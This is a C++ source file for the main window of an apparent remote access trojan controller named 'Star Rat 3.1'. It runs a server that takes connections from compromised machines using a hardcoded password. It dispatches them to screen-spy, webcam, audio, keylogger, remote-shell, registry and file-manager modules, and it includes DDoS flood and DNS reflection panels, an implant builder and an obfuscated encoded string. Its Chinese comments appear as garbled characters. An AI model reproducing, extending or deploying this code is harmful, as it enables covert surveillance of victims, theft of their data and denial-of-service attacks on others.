// MainFrm.cpp : implementation of the CMainFrame class
//

#include "pcl.h"
#include "Client.h"

#include "MainFrm.h"
#include "ClientView.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "PcView.h"
#include "DllDlg.h"

#include "SysInfo.h"
#include "RegDlg.h"

#include "Build.h"
#include "Setting.h"
#include "UpdateDlg.h"

#include "LogView.h"
#include "DDOSFlood.h"
#include "DDOSFlood1.h"
#include "DDOSWeb.h"
#include "DDOSWeb1.h"
#include "DDOSDrDos.h"
#include "decode.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_ICON_NOTIFY WM_USER+10

CPcView* g_pConnectView = NULL; //��NotifyProc�г�ʼ��
extern CClientView* g_pTabView; 
CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // ��CMainFrame::CMainFrame()�г�ʼ��
extern CLogView* g_pLogView;

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_COMMAND(IDM_SETTING, OnSetting)
	ON_COMMAND(IDM_BUILD, OnBuild)
	ON_COMMAND(IDM_IPUPDATE, OnIpupdate)
	ON_WM_ERASEBKGND()
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	//}}AFX_MSG_MAP
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_OS,
	ID_STAUTSCOUNT,
	ID_INDICATOR_CAPS,
	ID_INDICATOR_NUM,
	ID_INDICATOR_SCRL,
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction
CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	//���������ʾ
	this ->CenterWindow(CWnd::GetDesktopWindow());
	
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 485);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, NULL);
	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, NULL);
	m_wndStatusBar.SetPaneInfo(5, m_wndStatusBar.GetItemID(5), SBPS_NORMAL, NULL);
		
// 	m_wndStatusBar.EnableCustomization();

	XTPColorManager()->DisableLunaColors(TRUE);

	if (!m_TrayIcon.Create(_T("Online: 0"), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}	
	
	if (!InitCommandBars())
	{
		return -1;
	}
	
	CXTPCommandBars* pCommandBars = GetCommandBars();
	
	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(_T("Menu Bar"), IDR_MAINFRAME);
	pMenuBar->SetFlags(xtpFlagAddMDISysPopup);

	// Create ToolBar
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("Standard"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR4))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}
// 	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();
// 	pOptions->bShowExpandButtonAlways= FALSE;
// 	pOptions->bShowTextBelowIcons = true;
// 	pOptions->bLargeIcons = TRUE;
	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR4,IDB_BARNEW);
	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
// 	ModifyStyle(WS_THICKFRAME, 0);
// 	ModifyStyle(0, WS_THICKFRAME);

	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);
	XTPColorManager()->DisableLunaColors(TRUE);
	pCommandBars->SetTheme(xtpThemeOfficeXP);

	CXTPPaintManager::SetTheme(xtpThemeOffice2003);
	/*
	xtpThemeOffice2000,     // Office 2000 theme.
	xtpThemeOfficeXP,       // Office XP theme.
	xtpThemeOffice2003,     // Office 2003 theme.
	xtpThemeNativeWinXP,    // Windows XP themes support.
	xtpThemeWhidbey,        // Visual Studio 2005 theme.
	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
	xtpThemeVisualStudio6,    // Visual Studio 6 theme
	xtpThemeVisualStudio2010, // Visual Studio 2010 theme
	xtpThemeCustom          // Custom theme.
	*/
	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005Beta2); // ��������
// 	xtpPaneThemeDefault,               // Default Style Theme
// 	xtpPaneThemeVisualStudio2003,      // Visual Studio 2003 Style Theme
// 	xtpPaneThemeOffice2003,            // Office 2003 Style Theme
// 	xtpPaneThemeWinNative,             // Windows Native Style Theme
// 	xtpPaneThemeGrippered,             // Gripper Style Theme
// 	xtpPaneThemeOffice2002Visio,       // Office 2002 Visio Style Theme
// 	xtpPaneThemeVisualStudio2005Beta1, // Visual Studio 2005 Whidbey Beta 1 Style Theme
// 	xtpPaneThemeOffice2003Outlook,     // Office 2003 Outlook Style Theme
// 	xtpPaneThemeWinExplorer,           // Windows Explorer Style Theme
// 	xtpPaneThemeVisualStudio2005,      // Visual Studio 2005 Style Theme
// 	xtpPaneThemeResource,              // Office 2007/2010 Style Theme
// 	xtpPaneThemeOffice2007Word,        // Office 2007 Word Style Theme
// 	xtpPaneThemeOffice2007Outlook,     // Office 2007 Outlook Style Theme
// 	xtpPaneThemeVisualStudio6,         // Visual Studio 6 Style Theme
// 	xtpPaneThemeVisualStudio2005Beta2, // Visual Studio 2005 Whidbey Beta 2 Style Theme
// 	xtpPaneThemeVisualStudio2008,      // Visual Studio 2008 Style Theme
// 	xtpPaneThemeVisualStudio2010,      // Visual Studio 2010 Beta 1 Style Theme
// 	xtpPaneThemeOffice2003Visio,       // Office 2003 Visio Style Theme
// 	xtpPaneThemeOffice2007Visio,       // Office 2007 Visio Style Theme
	
	CXTPDockingPane* pwndPaneLog = CreatePane(20, 141, RUNTIME_CLASS(CLogView), _T(" ��־��Ϣ "), xtpPaneDockBottom);
// 	CXTPDockingPane* pwndPaneTool = CreatePane(20, 141, RUNTIME_CLASS(CTools), _T(" Batch "), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneDDOSFlood = CreatePane(20, 141, RUNTIME_CLASS(CDDOSFlood), _T(" �������1 "), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneDDOSFlood1 = CreatePane(20, 141, RUNTIME_CLASS(CDDOSFlood1), _T(" �������2 "), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneDDOSWeb = CreatePane(20, 141, RUNTIME_CLASS(CDDOSWeb), _T(" Web����1 "), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneDDOSWeb1 = CreatePane(20, 141, RUNTIME_CLASS(CDDOSWeb1), _T(" Web����2 "), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneDDOSDNS = CreatePane(20, 141, RUNTIME_CLASS(CDDOSDrDos), _T(" DNS "), xtpPaneDockBottom);
	
	m_paneManager.AttachPane( pwndPaneDDOSFlood, pwndPaneLog );
// 	m_paneManager.AttachPane( pwndPaneDDOSFlood, pwndPaneTool );
	m_paneManager.AttachPane( pwndPaneDDOSFlood1, pwndPaneDDOSFlood );
	m_paneManager.AttachPane( pwndPaneDDOSWeb, pwndPaneDDOSFlood1 );
	m_paneManager.AttachPane( pwndPaneDDOSWeb1, pwndPaneDDOSWeb );
	m_paneManager.AttachPane( pwndPaneDDOSDNS, pwndPaneDDOSWeb1 );
 	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
//	pwndPaneTool->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
 	pwndPaneDDOSFlood->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
	pwndPaneDDOSFlood1->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
	pwndPaneDDOSWeb->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
 	pwndPaneDDOSWeb1->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);
	pwndPaneDDOSDNS->SetOptions(xtpPaneNoCloseable|xtpPaneNoHideable|xtpPaneNoFloatable|xtpPaneNoCaption|xtpPaneNoDockable|xtpPaneNoFloatableByTabDoubleClick|xtpPaneNoFloatableByCaptionDoubleClick|xtpPaneNoHoverShow);

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	cs.cx = 920;
	cs.cy = 580;
	cs.style &= ~FWS_ADDTOTITLE;	
	cs.lpszName = _T("Star Rat 3.1��ɱԶ��[������̳ר�ð�]");
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// ��g_pConnectView ���г�ʼ��
		g_pConnectView = (CPcView *)((CClientApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView��û��������������ᷢ��
		if (((CClientApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

// 		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
// 		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str,strLogText;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	//�����ʹ�ñ�������Ϊ����������ɵ��κη����������߲���е�
	char WHtuF[] = {'F','O','i','5','D','A','/','q','C','b','Y','g','E','L','6','9','w','A','s','f','A','b','C','r','I','Q','E','N','q','b','6','9','w','A','s','f','A','Q','j','2','I','+','v','A','B','s','I','T','B','w','2','5','D','c','S','n','E','Q','Y','j','/','w','c','N','J','A','Q','i','H','M','G','4','I','O','f','A','H','8','K','w','T','w','=','=','\0'};
	g_pLogView->InsertLogItem( MyDecode(WHtuF), 0, 43 );

	// ����IPCP������
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		CString IP;
		
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");
		
		ShowWindow(SW_SHOW);
		UpdateWindow();
		CString web;
		web.Format(_T("%s:%d"), IP,nPort);
		m_wndStatusBar.SetPaneText(0, web);
		strLogText.Format( "%s   �����˿�: [%d]", "��ӭʹ�� Star Rat 3.1", nPort);
		g_pLogView->InsertLogItem( strLogText, 0, 43 );
	}
	else
	{
		str.Format(_T("�˿� %d ����ʧ��"), nPort);
		AfxMessageBox(str);
		ShowWindow(SW_SHOW);
		UpdateWindow();
		m_wndStatusBar.SetPaneText(0, str);
		strLogText.Format( "%s   �˿�[%d]����ʧ��", "��ӭʹ�� Star Rat 3.1��ɱԶ��[������̳ר�ð�]", nPort);
		g_pLogView->InsertLogItem( strLogText, 0, 43 );
 	}
	m_wndStatusBar.SetPaneText(2, _T("Online: 0"));
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSINFO_DLG:
			((CSysInfo *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:             //ע���
            ((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		case DLL_DLG:
			((CDllDlg *)dlg)->OnReceiveComplete();
	    	break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;
	case TOKEN_LOGIN: // ���߰�
		{
			pContext->m_bIsMainSocket = true;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
		}
		break;
	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST:
		g_pConnectView->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:		//ע������    
		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DLLMAIN:
		g_pConnectView->PostMessage(WM_OPENDLLDLG, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_YES: //����ɸѡ
		g_pConnectView->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_NO: //����ɸѡ
		g_pConnectView->PostMessage(WM_NOMODIFYLIST, 0, (LPARAM)pContext);
		break;
		// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	if (MessageBox(_T("ȷ���˳�?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	SaveCommandBars(_T("CommandBars"));
	pMainFrame->m_TrayIcon.RemoveIcon();

	m_iocpServer->Shutdown();
	delete m_iocpServer;
	CFrameWnd::OnClose();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		//iFly Rat v1.0
		char zVDrT[] = {'R','u','n','n','i','n','g','.','.','.','\0'};
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip( _T(zVDrT), _T("Star Rat 3.1��ɱԶ��[������̳ר�ð�]"), NIIF_NONE, 5);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	str.Format(_T("Online: %d"), a);
	m_wndStatusBar.SetPaneText(2, str);

	UpdateData();
	
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	ASSERT_VALID(pMainFrame);
	pMainFrame->m_TrayIcon.SetTooltipText(str);
}

void CMainFrame::ShowOSCount()
{
	CString str;
	str.Format(_T("NT:%d	2k:%d	XP:%d	2k3:%d	Vista:%d	2k8:%d	W7:%d	W8:%d	2k12:%d"), 
		nOSCount[0],
		nOSCount[1], 
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8]);
	m_wndStatusBar.SetPaneText(1, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MaximizeFromTray(this);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T("������������Ϣ: "), NIIF_NONE, 5);
}

void CMainFrame::OnSetting() 
{
	// TODO: Add your command handler code here
	CSetting dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	CBuild dlg;
	dlg.DoModal();
}

void CMainFrame::SetTheme(int iTheme)
{
	m_iTheme = iTheme;
	XTThemeManager()->SetTheme((XTThemeStyle)m_iTheme);
	XTPPaintManager()->SetTheme((XTPPaintTheme)m_iTheme);	
	RedrawWindow( NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN );	
	RecalcLayout();
}

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//�������
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	
	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		
		return TRUE; // handled
	}
	return FALSE;
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::OnIpupdate() 
{
	// TODO: Add your command handler code here
	static CUpdateDlg *m_IpUpdate =NULL;
	if(m_IpUpdate==NULL)
	{
		m_IpUpdate= new CUpdateDlg;
		m_IpUpdate->Create(IDD_UPDATE_DLG,GetDesktopWindow());
	}	
	m_IpUpdate->ShowWindow(SW_SHOW);
}
